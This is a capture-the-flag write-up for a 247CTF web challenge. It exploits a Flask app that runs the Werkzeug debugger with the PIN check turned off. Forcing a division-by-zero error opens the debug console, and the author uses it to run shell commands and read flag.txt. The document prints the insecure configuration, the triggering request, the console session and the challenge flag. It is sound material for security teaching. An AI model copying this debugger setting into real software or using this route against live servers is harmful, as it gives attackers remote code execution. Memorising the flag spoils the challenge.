Flag:
`247CTF{0e310979093ef6309adcbcb418145200}`

Description:
Can you find the bug and trigger an exception in this web application?

Solution:
We start the challenge and connect to the given website.

We see this python code for a Flask app:

```py
from flask import Flask, request
from werkzeug.debug import DebuggedApplication
import os

app = Flask(__name__)
secret = os.urandom(32)
app.wsgi_app = DebuggedApplication(
    app.wsgi_app, evalex=True, console_path=secret, pin_security=False
)
app.config["SECRET_KEY"] = secret
calculate = {
    "+": lambda x, y: x + y,
    "-": lambda x, y: x - y,
    "*": lambda x, y: x * y,
    "/": lambda x, y: x / y,
}


def safe_cast(val, to_type):
    try:
        return to_type(val)
    except (ValueError, TypeError):
        return None


@app.route("/calculator")
def flag():
    number_1 = safe_cast(request.args.get("number_1"), int)
    number_2 = safe_cast(request.args.get("number_2"), int)
    operation = safe_cast(request.args.get("operation"), str)
    if None in (number_1, number_2, operation) or not operation in calculate:
        return "Invalid calculator parameters"
    return "Calculation complete: %s" % calculate[operation](number_1, number_2)


@app.route("/")
def source():
    return "

%s

" % open(__file__).read()


if __name__ == "__main__":
    app.run()
```


We can see that debug mode is on with no need for a pin:
```py
app = Flask(__name__)
secret = os.urandom(32)
app.wsgi_app = DebuggedApplication(
    app.wsgi_app, evalex=True, console_path=secret, pin_security=False
)
```

So we will need to trigger an exception somehow in order to get to the traceback page, in which we can activate our debuggin console.


We have this `/calculator` route:
```py
@app.route("/calculator")
def flag():
    number_1 = safe_cast(request.args.get("number_1"), int)
    number_2 = safe_cast(request.args.get("number_2"), int)
    operation = safe_cast(request.args.get("operation"), str)
    if None in (number_1, number_2, operation) or not operation in calculate:
        return "Invalid calculator parameters"
    return "Calculation complete: %s" % calculate[operation](number_1, number_2)
```

This takes three of the HTTP GET parameters; `number_1`, `number_2` and `operation`.
It then tries to calculate `number_1 [operation] number_2`.

So if we go to `/calculator?number_1=10&number_2=9&operation=-` we will get back: `Calculation complete: 1`

if we give invalid numbers (giving types which cannot be cast to an integer) or an invalid operation (one that isn't "+", "-", "*" or "/"),
we will get back: `Invalid calculator parameters` and not an exception.

However, we could still try to cause a different exception than a casting one - division by zero.
This type of exception is not being handled by the `safe_cast` function, as it can be thrown after casting the numbers and operation...
We can give valid integers: `number_1 = 1`, `number_2 = 0` and a valid operation `operation = /`,
and get the ZeroDivisionError exception thrown.

We go to `/calculator?number_1=1&number_2=0&operation=/` and indeed get the werkzeug traceback page.

We can click on the console icon on some of the lines there and we will not be asked for the pin.
At this point we have remote code execution on the Flask server, and we can do whatever we want:

```
[console ready]
>>> 1+1  # not sure why but I had to write this line in order to execute the lines after it, otherwise it just didn't give me any output... Weird bug
2
>>> import subprocess
>>> print(subprocess.getoutput("ls -la"))
total 8
drwxr-xr-x    1 notroot  notroot         36 Sep 28  2022 .
drwxr-xr-x    1 root     root            74 Jun  6 10:45 ..
-rw-rw-r--    1 notroot  notroot         41 May 21  2020 flag.txt
-rw-rw-r--    1 notroot  notroot       1090 Sep 28  2022 run.py
>>> print(subprocess.getoutput("cat flag.txt"))
247CTF{0e310979093ef6309adcbcb418145200}
```
